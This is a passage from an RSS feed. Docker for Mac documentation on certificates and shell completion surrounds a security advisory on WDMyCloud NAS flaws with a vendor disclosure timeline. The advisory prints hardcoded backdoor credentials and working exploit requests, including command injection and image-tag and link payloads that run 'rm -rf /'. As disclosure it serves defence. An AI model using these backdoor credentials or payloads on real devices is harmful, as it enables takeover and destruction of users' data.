&lt;div class=&quot;language-bash highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;security add-trusted-cert &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; trustRoot &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; /Library/Keychains/System.keychain ca.crt
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Or, if you prefer to add the certificate to your own local keychain only (rather than for all users), run this command instead:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;security add-trusted-cert -d -r trustRoot -k ~/Library/Keychains/login.keychain ca.crt
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;See also, &lt;a href=&quot;#directory-structures-for-certificates&quot;&gt;Directory structures for certificates&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; You need to restart Docker for Mac after making any changes to the keychain or to the &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.docker/certs.d&lt;/code&gt; directory in order for the changes to take effect.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For a complete explanation of how to do this, see the blog post &lt;a href=&quot;http://container-solutions.com/adding-self-signed-registry-certs-docker-mac/&quot;&gt;Adding Self-signed Registry Certs to Docker &amp;amp; Docker for Mac&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&quot;add-client-certificates&quot;&gt;Add client certificates&lt;/h3&gt;
&lt;p&gt;You can put your client certificates in &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.docker/certs.d/&amp;lt;MyRegistry&amp;gt;:&amp;lt;Port&amp;gt;/client.cert&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.docker/certs.d/&amp;lt;MyRegistry&amp;gt;:&amp;lt;Port&amp;gt;/client.key&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;When the Docker for Mac application starts up, it copies the &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.docker/certs.d&lt;/code&gt; folder on your Mac to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/docker/certs.d&lt;/code&gt; directory on Moby (the Docker for Mac &lt;code class=&quot;highlighter-rouge&quot;&gt;xhyve&lt;/code&gt; virtual machine).&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul readability=&quot;1.9461697722567&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;You need to restart Docker for Mac after making any changes to the keychain or to the &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.docker/certs.d&lt;/code&gt; directory in order for the changes to take effect.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3.8414634146341&quot;&gt;
&lt;p&gt;The registry cannot be listed as an &lt;em&gt;insecure registry&lt;/em&gt; (see &lt;a href=&quot;/docker-for-mac/index.md#docker-daemon&quot;&gt;Docker Daemon&lt;/a&gt;). Docker for Mac will ignore certificates listed under insecure registries, and will not send client certificates. Commands like &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; that attempt to pull from the registry will produce error messages on the command line, as well as on the registry.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h3 id=&quot;directory-structures-for-certificates&quot;&gt;Directory structures for certificates&lt;/h3&gt;
&lt;p&gt;If you have this directory structure, you do not need to manually add the CA certificate to your Mac OS system login:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;/Users/&amp;lt;user&amp;gt;/.docker/certs.d/
└── &amp;lt;MyRegistry&amp;gt;:&amp;lt;Port&amp;gt;
   ├── ca.crt
   ├── client.cert
   └── client.key
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The following further illustrates and explains a configuration with custom certificates:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;/etc/docker/certs.d/        &amp;lt;-- Certificate directory
└── localhost:5000          &amp;lt;-- Hostname:port
   ├── client.cert          &amp;lt;-- Client certificate
   ├── client.key           &amp;lt;-- Client key
   └── ca.crt               &amp;lt;-- Certificate authority that signed
                                the registry certificate
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;You can also have this directory structure, as long as the CA certificate is also in your keychain.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;/Users/&amp;lt;user&amp;gt;/.docker/certs.d/
└── &amp;lt;MyRegistry&amp;gt;:&amp;lt;Port&amp;gt;
    ├── client.cert
    └── client.key
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;To learn more about how to install a CA root certificate for the registry and how to set the client TLS certificate for verification, see &lt;a href=&quot;/engine/security/certificates.md&quot;&gt;Verify repository client with certificates&lt;/a&gt; in the Docker Engine topics.&lt;/p&gt;
&lt;h2 id=&quot;install-shell-completion&quot;&gt;Install shell completion&lt;/h2&gt;
&lt;p&gt;Docker for Mac comes with scripts to enable completion for the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-machine&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose&lt;/code&gt; commands. The completion scripts may be found inside &lt;code class=&quot;highlighter-rouge&quot;&gt;Docker.app&lt;/code&gt;, in the &lt;code class=&quot;highlighter-rouge&quot;&gt;Contents/Resources/etc/&lt;/code&gt; directory and can be installed both in Bash and Zsh.&lt;/p&gt;
&lt;h3 id=&quot;bash&quot;&gt;Bash&lt;/h3&gt;
&lt;p&gt;Bash has &lt;a href=&quot;https://www.debian-administration.org/article/316/An_introduction_to_bash_completion_part_1&quot;&gt;built-in support for completion&lt;/a&gt; To activate completion for Docker commands, these files need to be copied or symlinked to your &lt;code class=&quot;highlighter-rouge&quot;&gt;bash_completion.d/&lt;/code&gt; directory. For example, if you installed bash via &lt;a href=&quot;http://brew.sh/&quot;&gt;Homebrew&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /Applications/Docker.app/Contents/Resources/etc/docker.bash-completion /usr/local/etc/bash_completion.d/docker
ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /Applications/Docker.app/Contents/Resources/etc/docker-machine.bash-completion /usr/local/etc/bash_completion.d/docker-machine
ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /Applications/Docker.app/Contents/Resources/etc/docker-compose.bash-completion /usr/local/etc/bash_completion.d/docker-compose
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&quot;zsh&quot;&gt;Zsh&lt;/h3&gt;
&lt;p&gt;In Zsh, the &lt;a href=&quot;http://zsh.sourceforge.net/Doc/Release/Completion-System.html&quot;&gt;completion system&lt;/a&gt; takes care of things. To activate completion for Docker commands, these files need to be copied or symlinked to your Zsh &lt;code class=&quot;highlighter-rouge&quot;&gt;site-functions/&lt;/code&gt; directory. For example, if you installed Zsh via &lt;a href=&quot;http://brew.sh/&quot;&gt;Homebrew&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /Applications/Docker.app/Contents/Resources/etc/docker.zsh-completion /usr/local/share/zsh/site-functions/_docker
ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /Applications/Docker.app/Contents/Resources/etc/docker-machine.zsh-completion /usr/local/share/zsh/site-functions/_docker-machine
ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /Applications/Docker.app/Contents/Resources/etc/docker-compose.zsh-completion /usr/local/share/zsh/site-functions/_docker-compose
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;give-feedback-and-get-help&quot;&gt;Give feedback and get help&lt;/h2&gt;
&lt;p&gt;To get help from the community, review current user topics, join or start a discussion, log on to our &lt;a href=&quot;https://forums.docker.com/c/docker-for-mac&quot;&gt;Docker for Mac forum&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To report bugs or problems, log on to &lt;a href=&quot;https://github.com/docker/for-mac/issues&quot;&gt;Docker for Mac issues on GitHub&lt;/a&gt;, where you can review community reported issues, and file new ones. See &lt;a href=&quot;/docker-for-mac/troubleshoot/#diagnose-problems-send-feedback-and-create-github-issues&quot;&gt;Diagnose problems, send feedback, and create GitHub issues&lt;/a&gt;. As a part of reporting issues on GitHub, we can help you troubleshoot the log data.&lt;/p&gt;
&lt;p&gt;To give us feedback on the documentation or update it yourself, use the Feedback options at the bottom of each docs page.&lt;/p&gt;
&lt;h2 id=&quot;docker-store&quot;&gt;Docker Store&lt;/h2&gt;
&lt;p&gt;Choose &lt;strong&gt;Docker Store&lt;/strong&gt; from the Docker for Mac menu to get to the Docker app downloads site. &lt;a href=&quot;https://store.docker.com/&quot;&gt;Docker store&lt;/a&gt; is a component of the next-generation Docker Hub, and the best place to find compliant, trusted commercial and free software distributed as Docker Images.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/docker-store.png&quot; alt=&quot;Docker Store&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;docker-cloud&quot;&gt;Docker Cloud&lt;/h2&gt;
&lt;p&gt;You can access your &lt;a href=&quot;/docker-cloud/index.md&quot;&gt;Docker Cloud&lt;/a&gt; account from within Docker for Mac.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/docker-cloud.png&quot; alt=&quot;Docker Cloud&quot;/&gt;&lt;/p&gt;
&lt;p&gt;From the Docker for Mac menu, sign in to Docker Cloud with your Docker ID, or create one.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/docker-for-mac/images/menu-cloud-sign-in.png&quot; alt=&quot;Docker Cloud sign-in&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Then use the Docker for Mac menu to create, view, or navigate directly to your Cloud resources, including &lt;strong&gt;organizations&lt;/strong&gt;, &lt;strong&gt;repositories&lt;/strong&gt;, and &lt;strong&gt;swarms&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Check out these &lt;a href=&quot;/docker-cloud/index.md&quot;&gt;Docker Cloud topics&lt;/a&gt; to learn more:&lt;/p&gt;
&lt;p&gt;Need a direct link to Cloud? &lt;a href=&quot;https://cloud.docker.com/&quot; target=&quot;_blank&quot; class=&quot;_&quot;&gt;Take me to Docker Cloud&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;where-to-go-next&quot;&gt;Where to go next&lt;/h2&gt;
&lt;span&gt;&lt;a href=&quot;/glossary/?term=mac&quot;&gt;mac&lt;/a&gt;, &lt;a href=&quot;/glossary/?term=beta&quot;&gt;beta&lt;/a&gt;, &lt;a href=&quot;/glossary/?term=edge&quot;&gt;edge&lt;/a&gt;, &lt;a href=&quot;/glossary/?term=alpha&quot;&gt;alpha&lt;/a&gt;, &lt;a href=&quot;/glossary/?term=tutorial&quot;&gt;tutorial&lt;/a&gt;&lt;/span&gt;  
</description>
<pubDate>Sat, 06 Jan 2018 07:07:56 +0000</pubDate>
<dc:creator>watoc</dc:creator>
<og:image>/favicons/docs@2x.ico</og:image>
<og:type>website</og:type>
<og:description>Welcome to Docker for Mac! Docker is a full development platform for creating containerized apps, and Docker for Mac is the best way to get started with Docker on a...</og:description>
<og:title>Get started with Docker for Mac</og:title>
<og:url>https://docs.docker.com/docker-for-mac/</og:url>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://docs.docker.com/docker-for-mac/</dc:identifier>
</item>
<item>
<title>WDMyCloud Multiple Vulnerabilities</title>
<link>http://gulftech.org/advisories/WDMyCloud%20Multiple%20Vulnerabilities/125</link>
<guid isPermaLink="true" >http://gulftech.org/advisories/WDMyCloud%20Multiple%20Vulnerabilities/125</guid>
<description>&lt;div&gt;&lt;img class=&quot;details_spacer&quot; src=&quot;http://gulftech.org/images/blank.png&quot;/&gt;&lt;/div&gt;
&lt;strong&gt;Vendor&lt;/strong&gt;: Western Digital&lt;br/&gt;&lt;strong&gt;Product&lt;/strong&gt;: WDMyCloud&lt;br/&gt;&lt;strong&gt;Version&lt;/strong&gt;: &lt;br/&gt;&lt;strong&gt;Website&lt;/strong&gt;: &lt;a href=&quot;https://www.wdc.com/products/network-attached-storage.html&quot; target=&quot;_blank&quot;&gt;https://www.wdc.com/products/network-attached-storage.html&lt;/a&gt;&lt;br/&gt;&lt;div&gt;&lt;img class=&quot;details_spacer&quot; src=&quot;http://gulftech.org/images/blank.png&quot;/&gt;&lt;/div&gt;
&lt;div&gt;&lt;img class=&quot;details_spacer&quot; src=&quot;http://gulftech.org/images/blank.png&quot;/&gt;&lt;/div&gt;
&lt;pre&gt;
###########################################################################
                     ______      ____________          __  
                    / ____/_  __/ / __/_  __/__  _____/ /_ 
                   / / __/ / / / / /_  / / / _ \/ ___/ __ \
                  / /_/ / /_/ / / __/ / / /  __/ /__/ / / /         
                  \____/\__,_/_/_/   /_/  \___/\___/_/ /_/ 
                                                                
                     GulfTech Research and Development                                                                 

###########################################################################
#             WDMyCloud &amp;lt;= 2.30.165 Multiple Vulnerabilities              #
###########################################################################

Released Date: 2018-01-04
Last Modified: 2017-06-11
 Company Info: Western Digital
 Version Info: 
              Vulnerable
               MyCloud 
               MyCloudMirror 
               My Cloud Gen 2
               My Cloud PR2100
               My Cloud PR4100
               My Cloud EX2 Ultra
               My Cloud EX2
               My Cloud EX4
               My Cloud EX2100
               My Cloud EX4100
               My Cloud DL2100
               My Cloud DL4100

              Not Vulnerable
               MyCloud 04.X Series
               MyCloud 2.30.174

 

--[ Table of contents

00 - Introduction
    00.1 Background

01 - Unrestricted file upload
    01.1 - Vulnerable code analysis
    01.2 - Remote exploitation

02 - Hard coded backdoor
    02.1 - Vulnerable code analysis
    02.2 - Remote exploitation

03 - Miscellaneous security issues
    03.1 - Cross site request forgery
    03.2 - Command injection
    03.3 - Denial of service
    03.4 - Information disclosure

04 - Reused Code

05 - Credit

06 - Proof of concept

07 - Disclosure timeline

08 - Solution

09 - Contact information

10 - References


--[ 00 - Introduction

The purpose of this article is to detail the research that I have completed 
regarding the Western Digital MyCloud family of devices.

Several serious security issues were uncovered during my research. 
Vulnerabilities such as pre auth remote root code execution, as well as a 
hardcoded backdoor admin account which can NOT be changed. The backdoor 
also allows for pre auth remote root code execution on the affected device.

The research was conducted on both a WDMyCloud 4TB and a WDMyCloudMirror
16TB with the latest available firmware 2.30.165. My research shows that
the 04 branch of the WDMyCloud firmware is not vulnerable to these issues.

--[ 00.1 - Background

WD My Cloud is a personal cloud storage unit to organize your photos and 
videos. It is currently the best selling NAS (network attached storage)
device listed on the amazon.com website, and is used by individuals and
businesses alike.  It's purpose is to host your files, and it also has the
ability to sync them with various cloud and web based services.


--[ 01 - Unrestricted file upload

The WDMyCloud device is vulnerable to an unrestricted file upload 
vulnerability within the following file:

/usr/local/modules/web/pages/jquery/uploader/multi_uploadify.php

The root of the problem here is due to the misuse and misunderstanding of
the PHP gethostbyaddr() function used within PHP, by the developer of this 
particular piece of code. From the PHP manual this functions return values 
are defined as the following for gethostbyaddr():

&quot;Returns the host name on success, the unmodified ip_address on failure, or 
FALSE on malformed input.&quot;

With a brief overview of the problem, let's have a look at the offending 
code in order to get a better understanding of what is going on with this 
particular vulnerability.

--[ 01.1 - Vulnerable code analysis

Below is the code from the vulnerable &quot;multi_uploadify.php&quot; script. You can
see that I have annoted the code to explain what is happening.

#BUG 01: Here the attacker controlled &quot;Host&quot; header is used to define the 
remote auth server. This is by itself really bad, as an attacker could
easily just specify that the host be the IP address of a server that they
are in control of. But, if we send it an invalid &quot;Host&quot; header it will just
simply return FALSE as defined in the PHP manual.

$ip = gethostbyaddr($_SERVER['HTTP_HOST']);
$name = $_REQUEST['name'];
$pwd = $_REQUEST['pwd'];
$redirect_uri =  $_REQUEST['redirect_uri']; 

//echo $name .&quot;&lt;br/&gt;&quot;.$pwd.&quot;&lt;br/&gt;&quot;.$ip;

#BUG 02: At this point, this request should always fail. The $result
variable should now be set to FALSE.

$result = @stripslashes( @join( @file( &quot;http://&quot;.$ip.&quot;/mydlink/mydlink.cgi?
cmd=1&amp;amp;name=&quot;.$name.&quot;=&amp;amp;pwd=&quot;.$pwd ),&quot;&quot; ));

#BUG 03: Here an empty haystack is searched, and thus strstr() returns a
value of FALSE.

$result_1 = strstr($result,&quot;0&quot;);
$result_1 = substr ($result_1, 0,28);  

#BUG 04: The strncmp() call here is a strange one. It looks for a specific
login failure. So, it never accounts for when things go wrong or slightly
unexpected. As a result this &quot;if&quot; statement will always be skipped.

if (strncmp ($result_1,&quot;0&quot;,28) == 0 )
//if (strstr($result,&quot;0&quot;)== 0 )
{
    header(&quot;HTTP/1.1 302 Found&quot;);
  header(&quot;Location: &quot;.$redirect_uri.&quot;?status=0&quot;);
  exit();   
}

#BUG 05: At this point all checks have been passed, and an attacker can use
this issue to upload any file to the server that they want.

The rest of the source code was omitted for the sake of breivity, but it 
just handles the file upload logic once the user passes the authentication
checks.

--[ 01.2 - Remote exploitation

Exploiting this issue to gain a remote shell as root is a rather trivial
process. All an attacker has to do is send a post request that contains a 
file to upload using the parameter &quot;Filedata[0]&quot;, a location for the file 
to be upload to which is specified within the &quot;folder&quot; parameter, and of 
course a bogus &quot;Host&quot; header.

I have written a Metasploit module to exploit this issue. The module will
use this vulnerability to upload a PHP webshell to the &quot;/var/www/&quot;
directory. Once uploaded, the webshell can be executed by requesting a URI
pointing to the backdoor, and thus triggering the payload.


--[ 02 - Hard coded backdoor

After finding the previously mentioned file upload vulnerability I decided
to switch gears and start reversing the CGI binaries that were accessable
via the web interface. The CGI binaries are standard Linux ELF executables
and pretty easy to go through. Within an hour of starting I stumbled 
across the following file located at:

/usr/local/modules/cgi/nas_sharing.cgi

The above file can be accessed by visiting &quot;/cgi-bin/nas_sharing.cgi&quot; but 
it produces server errors with every single method, except when the &quot;cmd&quot;
parameter was set to &quot;7&quot;. This piqued my interest and so I really started
digging into the binary, as it seemed very buggy and possibly vulnerable.

As it turns out the error was caused due to buggy code and nothing I was or 
wasn't doing wrong. But, while I was figuring out the cause of the error I 
happened to come across the following function that is used to authenticate 
the remote user. 

--[ 02.1 - Vulnerable code analysis

Below is the psuedocode created from the disassembly of the binary. I have
renamed the function to &quot;re_BACKDOOR&quot; to visually identify it more easily.

struct passwd *__fastcall re_BACKDOOR(const char *a1, const char *a2)
{
  const char *v2; // r5@1
  const char *v3; // r4@1
  struct passwd *result; // r0@4
  FILE *v5; // r6@5
  struct passwd *v6; // r5@7
  const char *v7; // r0@9
  size_t v8; // r0@10
  int v9; // [sp+0h] [bp-1090h]@1
  char s; // [sp+1000h] [bp-90h]@1
  char dest; // [sp+1040h] [bp-50h]@1

  v2 = a2;
  v3 = a1;
  memset(&amp;amp;s, 0, 0x40u);
  memset(&amp;amp;dest, 0, 0x40u);
  memset(&amp;amp;v9, 0, 0x1000u);
  if ( *v2 )
  {
    v8 = strlen(v2);
    _b64_pton(v2, (u_char *)&amp;amp;v9, v8);
    if ( dword_2C2E4 )
    {
      sub_1194C((const char *)&amp;amp;unk_1B1A4, v2);
      sub_1194C(&quot;pwd decode[%s]\n&quot;, &amp;amp;v9);
    }
  }
  if (!strcmp(v3, &quot;mydlinkBRionyg&quot;) 
  &amp;amp;&amp;amp;  !strcmp((const char *)&amp;amp;v9, &quot;abc12345cba&quot;) )
  {
    result = (struct passwd *)1;
  }
  else
  {
    v5 = (FILE *)fopen64(&quot;/etc/shadow&quot;, &quot;r&quot;);
    while ( 1 )
    {
      result = fgetpwent(v5);
      v6 = result;
      if ( !result )
        break;
      if ( !strcmp(result-&amp;gt;pw_name, v3) )
      {
        strcpy(&amp;amp;s, v6-&amp;gt;pw_passwd);
        fclose(v5);
        strcpy(&amp;amp;dest, (const char *)&amp;amp;v9);
        v7 = (const char *)sub_1603C(&amp;amp;dest, &amp;amp;s);
        return (struct passwd *)(strcmp(v7, &amp;amp;s) == 0);
      }
    }
  }
  return result;
}

As you can see in the above code, the login functionality specifically
looks for an admin user named &quot;mydlinkBRionyg&quot; and will accept the password
of &quot;abc12345cba&quot; if found. This is a classic backdoor. Simply login with 
the credentials that I just mentioned from the above code.

Also, it is peculiar that the username is &quot;mydlinkBRionyg&quot;, and that the 
vulnerability in Section 1 of this paper refers to a non existent file name
of &quot;mydlink.cgi&quot; but, more about that later in section 4...

--[ 02.2 - Remote exploitation

At first, to the untrained eye, exploiting this backdoor to do useful
things may seem problematic due to the fact that only method &quot;7&quot; gives us
no error. And, method 7 only allows us the ability to download any files in 
&quot;/mnt/&quot;, but no root shell. But, we want a root shell. Right?

After digging deeper I realized that the CGI script was dying every time, 
but only at the final rendering phase due to what seems like an error where 
the programmer forgot to specify the content type header on output, thus 
confusing the webserver and causing the crash. So, everything we do gets 
executed up until that point successfully. It is just blind execution.

Now that I had that figured out I started looking for a method I could then
exploit to gain shell access. I started with method &quot;51&quot; because it was the 
first one I looked at. This particular method happened to contain a command 
injection issue. Now I easily could turn this backdoor into a root 
shell, and gain control of the affected device.

GET /cgi-bin/nas_sharing.cgi?dbg=1&amp;amp;cmd=51&amp;amp;user=mydlinkBRionyg&amp;amp;passwd=YWJjMT
IzNDVjYmE&amp;amp;start=1&amp;amp;count=1;touch+/tmp/gulftech; HTTP/1.1

By sending a request like the one above a remote attacker could now execute
any commands as root. And yes, the password is base64 encoded, as that is
what the script expects. In the example above I simply create a file called 
&quot;gulftech&quot; located in the &quot;/tmp/&quot; directory.

The triviality of exploiting this issues makes it very dangerous, and even
wormable. Not only that, but users locked to a LAN are not safe either. An
attacker could literally take over your WDMyCloud by just having you visit
a website where an embedded iframe or img tag make a request to the 
vulnerable device using one of the many predictable default hostnames for
the WDMyCloud such as &quot;wdmycloud&quot; and &quot;wdmycloudmirror&quot; etc.

&amp;lt;img src=&quot;http://wdmycloud/cgi-bin/nas_sharing.cgi?dbg=1&amp;amp;cmd=51&amp;amp;user=mydlin
kBRionyg&amp;amp;passwd=YWJjMTIzNDVjYmE&amp;amp;start=1&amp;amp;count=1;rm+-rf+/;&quot;&amp;gt;

For example simply visiting the above link will totally destroy a WDMyCloud
without the need for any type of authentication whatsoever, and there is 
nothing you can do about it except delete the file as the credentials are 
hardcoded into the binary itself.


--[ 03 - Miscellaneous vulnerabilities

In addition to the two previously mentioned critical vulnerabilities were
also several other issues. These other issues are still very dangerous, but
require authentication in some cases, and for the most part are not 
considered as critical, and also require less technical explanation. 

--[ 03.1 - Cross site request forgery

There is no real XSRF protection within the WDMyCloud web interface. This
can have quite the impact on unsuspecting users. Exploitation of this issue 
is trivial.

http://wdmycloud/web/dsdk/DsdkProxy.php?;rm -rf /;

For example, if a logged in WDMyCloud admin visits, or is forced to visit
the above link, then the entire device will be wiped out. This is just one
of many XSRF issues. We do not have time to track them all down.

--[ 03.2 - Command injection

Some time ago, a researcher from the &quot;Exploiteers&quot; team found an alarming
number of command injection issues within the WDMyCloud. Unfortunately, we 
were able to find quite a few as well.

class RemoteBackupsAPI{
    public function getRecoverItems()
    {
        $xmlPath = &quot;/var/www/xml/rsync_recover_items.xml&quot;;
        $jobName = $_REQUEST['jobName'];
        
        @unlink($xmlPath);
        
        $cmd = &quot;rsyncmd -l \&quot;$xmlPath\&quot; -r \&quot;$jobName\&quot; &amp;gt;/dev/null&quot;;
        system($cmd);
        
        if (file_exists($xmlPath))
        {
            print file_get_contents($xmlPath);
        }
        else
        {
            print &quot;&quot;;
        }
    }
}

The above code is an example of the type of command injection issues that
still plague the WDMyCloud. This particular command injection is post auth,
as were all of the other command injections I found too. However, I did not 
have time to sift through looking for all of these. And by now I feel 
that the manufacturer should know better considering they just went through 
the process of patching many command injection vulnerabilities disclosed by 
the Exploiteers.[1]

--[ 03.3 - Denial of service

It is possible for an attacker to abuse language preferences functionality
in order to cause a DoS to the web interface. This is due to the fact that
any unauthenticated user can set the global language preferences for the
entire device and all of its users. The psuedocode from the disassembled 
binary can be seen below.

int cgi_language()
{
  int v1; // [sp+0h] [bp-10h]@1

  cgiFormString(&quot;f_language&quot;, &amp;amp;v1, 8);
  xml_set_str((int)&quot;/language&quot;, (int)&amp;amp;v1);
  xml_write_file(&quot;/etc/NAS_CFG/config.xml&quot;);
  LIB_CP_Config_To_MTD(1);
  cgiHeaderContentType(&quot;text/html&quot;);
  return system(&quot;language.sh &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;);
}

This is not a very useful attack vector since we only have 8 bytes to work 
with. But, you can make a script that keeps randomly resetting the language 
to some random language and it will affect all users of the device and 
requires no authentication. It is very hard to use the device if it is 
rendering all of the pages in a language you can not understand.

http://wdmycloud/cgi-bin/login_mgr.cgi?cmd=cgi_language&amp;amp;f_language=7

The above example request sets the language to korean. There are 17 
available language codes. Details can be found in language.sh located on 
the target device.

--[ 03.4 - Information disclosure

It is possible for an attacker to dump a list of all users, including
detailed user information.

GET /api/2.1/rest/users? HTTP/1.1

Making a simple request to the webserver like the one above will dump the
user information to an attacker for all users. This does not require any 
authentication in order to take advantage of.


--[ 04 - D-Link DNS-320L ShareCenter

As I have mentioned earlier in this article, I found it peculiar that 
the username used for the backdoor is &quot;mydlinkBRionyg&quot;, and that the 
vulnerability in Section 1 of this paper refers to a non existent file name
of &quot;mydlink.cgi&quot;. This really piqued my curiosity, and so I started using
google to try to track down some leads. After searching for the term of
&quot;mydlink.cgi&quot; I came across a reference to a post made by a D-Link user
regarding their D-Link DNS-320L ShareCenter NAS device.[2]

Within that post were references to file names and directory structure that
were fairly unique, and from the D-link device. But, they also perfectly 
matched my WDMyCloud device. The more I looked into this the weirder it 
seemed. So, I gained access to a D-Link DNS-320L ShareCenter. Once I had it 
things became pretty clear to me as the D-Link DNS-320L had the same exact 
hard coded backdoor and same exact file upload vulnerability that was 
present within the WDMyCloud. So, it seems that the WDMyCloud software 
shares a large amount of the D-Link DNS-320L code, backdoor and all. There 
are also other undeniable examples such as misspelled function names and 
other anomalies that match up within both the WDMyCloud and the D-Link 
DNS-320L ShareCenter code.

It should be noted that unlike the WDMyCloud the D-Link DNS-320L is 
currently NOT vulnerable to the backdoor and file upload issues, so you 
should upgrade your DNS-320L firmware as soon as possible as the issues can
be leveraged to gain a remote root shell on the DNS-320L if you are not up
to date with your device firmware. The backdoor was first removed in the 
1.0.6 firmware release. (July 28, 2014)

It is interesting to think about how before D-Link updated their software 
two of the most popular NAS device families in the world, sold by two of 
the most popular tech companies in the world were both vulnerable at the 
same time, to the same backdoor for a while. The time frame in which both 
devices were vulnerable at the same time in the wild was roughly from early 
2014 to later in 2014 based on comparing firmware release note dates.


--[ 05 - Credit

James Bercegay
GulfTech Research and Development


--[ 06 - Proof of concept

We strive to do our part to contribute to the security community.
Metasploit modules for issues outlined in this paper can be found online.


--[ 07 - Disclosure timeline

2017-06-10
Contacted vendor via web contact form. Assigned case #061117-12088041.

2017-06-12
Support member Gavin referred us to WDC PSIRT. We immediately sent a PGP
encrypted copy of our report to WDC PSIRT.

2017-06-13
Recieved confirmation of report from Samuel Brown.

2017-06-16
A period of 90 days is requested by vendor until full disclosure.

2017-12-15
Zenofex posts disclosure of the upload bug independantly of my research [3]

2018-01-03
Public Disclosure


--[ 08 - Solution

Upgrade firmware to version 2.30.174 
See the official vendor website for further details.


--[ 09 - Contact information

Web
https://gulftech.org/

Mail
security@gulftech.org


--[ 10 - References

[1] https://blog.exploitee.rs/2017/hacking_wd_mycloud/
[2] http://forums.dlink.com/index.php?topic=65415.0
[3] https://www.exploitee.rs/index.php/Western_Digital_MyCloud

Copyright 2018 GulfTech Research and Development. All rights reserved.
&lt;/pre&gt;</description>
<pubDate>Sat, 06 Jan 2018 01:42:34 +0000</pubDate>
<dc:creator>ronnier</dc:creator>
<dc:language>en-gb</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://gulftech.org/advisories/WDMyCloud%20Multiple%20Vulnerabilities/125</dc:identifier>
</item>
<item>
<title>The Extraordinary Life of Nikola Tesla</title>
<link>https://www.smithsonianmag.com/innovation/extraordinary-life-nikola-tesla-180967758/?no-ist</link>
